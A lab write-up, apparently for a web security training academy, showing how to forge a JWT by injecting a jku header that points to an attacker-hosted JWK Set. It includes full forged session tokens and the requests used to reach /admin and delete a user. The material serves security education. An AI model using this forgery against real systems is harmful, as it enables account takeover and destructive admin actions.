## JWT authentication bypass via jku header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip :

We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

## Notes

- /admin
- Search page
- Possibility to leave a comment on a post
- Exploit server

## Resume

1. Log in as your own user.
2. Send the post-login `GET /my-account` request to Burp Repeater.
3. Confirm that `/admin` is only accessible as `administrator`.
4. Test that the application accepts a remotely controlled JWK Set using Collaborator.
5. Generate a new RSA key pair in the JWT Editor.
6. Publish your public key as a JWK Set on the exploit server.
7. Modify the JWT so `sub` becomes `administrator`.
8. Add `jku` pointing to your hosted JWK Set.
9. Sign the token with your RSA key.
10. Access the admin panel and delete `carlos`.

## Solve

In Burp, load the JWT Editor extension from the BApp store.

In the lab, log in to your own account and send the post-login `GET /my-account` request to Burp Repeater.

The initial request was:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a7f00d203f1a4d4806b940c001a0077.web-security-academy.net
Cookie: session=eyJraWQiOiJlMTAzM2I0MC03ZjYxLTRhYWQtYTEzMy0zY2RiNDM0ZmQ2NzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MDMwNCwic3ViIjoid2llbmVyIn0.ROIhDtNrsS8uQEz--gu0MXJ5yEQgsIBh4J8fF3MqTGuU4ZIlJeKbG6BgV084JGxnKSOOJ5b0NDq6zIPD-8KTndkSl4M11oxMU1SHn37oHSUn3T6UT9Zg7BA7LG83gj_ClL0NzmXKTFcx64ylGPbhGVduK8s2CAUo7wEP-v-hOrJ8TCYJu0uHydzwva5_O_xcTmXBfqTvpzSWHC11TKH3et3KiZsnauNHek_Gyzm3GoAPY1KiLEU67Vh9kqnLnH9bnBQsPYNzQGK2UoUFEna0qzceDYjJh5dTe6PXoVWll_7tU3jhZlR2ke_WOe0492ryjwj2M-Ewgush419TZIjKRA
```

Then change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the `administrator` user.

Before hosting the real JWK Set, I tested whether the application would fetch a remote `jku` value.

In JWT Editor, I used **Attack** → **Embed Collaborator payload** and sent a request containing a JWT with a controlled `jku` value.

The Collaborator server received an HTTPS request, which confirmed that the backend was willing to fetch a remote JWK Set.

Go to the exploit server.

Replace the contents of the **Body** section with an empty JWK Set:

```json
{
    "keys": [

    ]
}
```

Back on the **JWT Editor Keys** tab, right-click the RSA key you generated and select **Copy Public Key as JWK**.

Paste the JWK into the `keys` array on the exploit server, then store the exploit. The JWK Set looked like this:

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "7066c4b7-892b-4523-931a-844c7ae721e1",
            "n": "nbUHsbMSFG_rq4c9tSQFttq5nZ6XltazIs8sHeiDZhL4Q7RZXIp5XkjYFu07_tcwTIVkoayX9wKkrY0NJCm5L3wsseV6___7cxDtLDHWTBTd3a_ydIrOumjqmwfzMKbLwO54wPZ3Nml91zitqBBhEl72463HXY6v2yhiMzLh5nk5CHzqflGkPFAjiTYWt2WIYifqCddaJPuw-SGaTbFVkkx1uX-azauars91wBE2LQIxr1EVd86hasYq_FgED4AZCvcBIjB9ecqzg5wv69qzOQJlSCLXm2UgXu1nVT9gFNFy0d8UhDNj1MKbmJQ5F_la7bOel_IYA0ydlNkKuBrhSw"
        }
    ]
}
```

Go back to the `GET /admin` request in Burp Repeater and switch to the extension-generated **JSON Web Token** tab.

In the header of the JWT, replace the current value of the `kid` parameter with the `kid` of the JWK that you uploaded to the exploit server.

Add a new `jku` parameter to the header of the JWT. Set its value to:

```text
https://exploit-0aaa001c03cba4a3806c93a3014600c0.exploit-server.net/jwks.json
```

In the payload, change the value of the `sub` claim to `administrator`.

Then, at the bottom of the tab, click **Sign**, select the RSA key you generated earlier, keep **Don't modify header** selected, and click **OK**.

Your forged admin request became:

```http
GET /admin HTTP/2
Host: 0a7f00d203f1a4d4806b940c001a0077.web-security-academy.net
Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhYTAwMWMwM2NiYTRhMzgwNmM5M2EzMDE0NjAwYzAuZXhwbG9pdC1zZXJ2ZXIubmV0L2p3a3MuanNvbiIsImtpZCI6IjcwNjZjNGI3LTg5MmItNDUyMy05MzFhLTg0NGM3YWU3MjFlMSIsInR5cCI6IkpXVCIsImFsZyI6IlJTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MDMwNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.er8_ag5yybJtAIpo6VgmttnfLl1Wcsrdr8wKoeLZ_eYVMqKkwiXvMoleUv8oIeuWn2aa5pLsbNhuj7fayS6FXXoQTR4s4PuzHej-UKxKMLgFVQiSgqIgR7z6l0hY9SCFI9GDJ3-9m5wZlCBdOzk4FmAa_ET11yZQZNZGSGilgeRyCmvXJAIPe5Vsh5u2XLXKXLXRV8Sd9RfqhCcdKQhngh9eev-f9LKqz7lbw4cdU6quDEhrdzKLBoch_fQOKR5OG6td31SStNw-q81oOJbCdIn-LvKplqzk8mU1YpWUr3ILor2lULfjBW_mC8nFqA8AVH5u56LikQ_FRg8rinJaZQ
```

Send the request. You should now successfully access the admin panel.

## Admin page HTML

The response from `/admin` contained this HTML:

```html
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

## Final request

Finally, send this request to delete `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a7f00d203f1a4d4806b940c001a0077.web-security-academy.net
Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFhYTAwMWMwM2NiYTRhMzgwNmM5M2EzMDE0NjAwYzAuZXhwbG9pdC1zZXJ2ZXIubmV0L2p3a3MuanNvbiIsImtpZCI6IjcwNjZjNGI3LTg5MmItNDUyMy05MzFhLTg0NGM3YWU3MjFlMSIsInR5cCI6IkpXVCIsImFsZyI6IlJTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MDMwNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.er8_ag5yybJtAIpo6VgmttnfLl1Wcsrdr8wKoeLZ_eYVMqKkwiXvMoleUv8oIeuWn2aa5pLsbNhuj7fayS6FXXoQTR4s4PuzHej-UKxKMLgFVQiSgqIgR7z6l0hY9SCFI9GDJ3-9m5wZlCBdOzk4FmAa_ET11yZQZNZGSGilgeRyCmvXJAIPe5Vsh5u2XLXKXLXRV8Sd9RfqhCcdKQhngh9eev-f9LKqz7lbw4cdU6quDEhrdzKLBoch_fQOKR5OG6td31SStNw-q81oOJbCdIn-LvKplqzk8mU1YpWUr3ILor2lULfjBW_mC8nFqA8AVH5u56LikQ_FRg8rinJaZQ
```

Send that request to solve the lab.